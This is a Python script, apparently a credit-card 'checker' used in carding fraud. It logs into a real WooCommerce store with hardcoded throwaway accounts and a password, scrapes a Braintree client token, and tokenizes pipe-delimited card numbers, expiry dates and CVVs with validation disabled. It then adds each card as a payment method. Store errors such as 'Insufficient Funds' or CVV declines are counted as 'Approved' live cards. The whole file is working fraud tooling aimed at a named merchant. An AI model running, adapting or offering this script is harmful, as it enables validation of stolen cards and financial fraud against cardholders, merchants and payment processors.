import random
import re
import names
from requests import Session
from dataclasses import dataclass
import uuid
import base64
import requests
import json
import names
from bs4 import BeautifulSoup
import uuid
from fake_useragent import UserAgent
def paserX(data, first, last):
  try:
    start = data.index( first ) + len( first )
    end = data.index( last, start )
    return data[start:end]
  except ValueError:
    return None 

@dataclass
class brainrrrt:
    def main(self, card):
        try:
            self.card = card
            self.ccs = card.split('|')
            if self.ccs[0].startswith("4"): self.brand = "VI"
            if self.ccs[0].startswith("3"): self.brand = "AE"
            elif self.ccs[0].startswith("5"): self.brand = "MC"
            def generar_correo():
                return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
            CorreoRand = generar_correo()
    
            Agent = UserAgent().random
            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
            self.session = requests.Session()
            correos = [
                "harivej516@noyavip.com",
                "worido4042@nriza.com",
                "demacow475@nriza.com",
                "fedesa4599@noyavip.com",
                "yakila3936@noyavip.com",
                "dobixoh970@noyavip.com",
                "demacow475@nriza.com",
                "harivej516@noyavip.com",
                "kokeli5032@dubokutv.com",
                "naxoxas135@cucadas.com",
            ]

            email = random.choice(correos)
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/edit-address/',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
            }

            response = self.session.get('https://www.velocityap.com/my-account/', headers=headers).text
            login = paserX(response, 'name="woocommerce-login-nonce" value="', '"')
            print(login)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.velocityap.com',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
            }

            data = {
                'username': email,
                'password': 'leito132asd',
                'wpa_initiator': '',
                'alt_s': '',
                'udtqic3271': '998610',
                'woocommerce-login-nonce': login,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
            }

            response = self.session.post('https://www.velocityap.com/my-account/',headers=headers, data=data)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/payment-methods/',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
            }

            response = self.session.get('https://www.velocityap.com/my-account/add-payment-method/', headers=headers).text
            eyj2 = re.search(r'wc_braintree_client_token = \["(.*?)"\];', response).group(1)
            decode = base64.b64decode(eyj2)
            decode_string = decode.decode("utf-8")

            json_data = json.loads(decode_string)   

            bearer = json_data.get('authorizationFingerprint')

            addpay = paserX(response, 'name="woocommerce-add-payment-method-nonce" value="', '"')

            print(addpay)
            print(bearer)

            headers = {
                'accept': '*/*',
                'accept-language': 'es-ES,es;q=0.7',
                'authorization': f'Bearer {bearer}',
                'braintree-version': '2018-05-10',
                'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com',
                'priority': 'u=1, i',
                'referer': 'https://assets.braintreegateway.com/',
                'user-agent': Agent,
            }

            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'dropin2',
                    'sessionId': str(uuid.uuid4()),
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                            'cvv': self.ccs[3],
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            response = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()
            token = response['data']['tokenizeCreditCard']['token']
            print(token)

            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'accept-language': 'es-ES,es;q=0.7',
                'cache-control': 'max-age=0',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.velocityap.com',
                'priority': 'u=0, i',
                'referer': 'https://www.velocityap.com/my-account/add-payment-method/',
                'upgrade-insecure-requests': '1',
                'user-agent': Agent,
            }

            data = {

                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': token,
                'braintree_cc_device_data': '',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': '',
                'woocommerce-add-payment-method-nonce': addpay,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
            }

            response = self.session.post('https://www.velocityap.com/my-account/add-payment-method/', headers=headers, data=data).text
            soup = BeautifulSoup(response, 'html.parser')

            # RESPONSE CUANDO SE AGREGA CORRECTAMENTE
            approved = soup.find('div', {'class': 'woocommerce-message'})

            if approved:
                return 'Approved! ✅', 'Card Added Successfully'

            # ERRORES
            error = soup.find('ul', {'class':'woocommerce-error'})

            if error:

                err = error.text.strip()



                if 'Card Issuer Declined CVV' in err:
                    return 'Approved! ✅', err

                elif 'Insufficient Funds' in err:
                    return 'Approved! ✅', err

                elif 'CVV' in err:
                    return 'Approved! ✅', err

                elif 'avs' in err.lower():
                    return 'Approved! ✅', err

                else:
                    return 'Declined ❌', err

            # SI NO HAY RESPONSE
        except:return 'Declined ❌', 'Unknown Error'
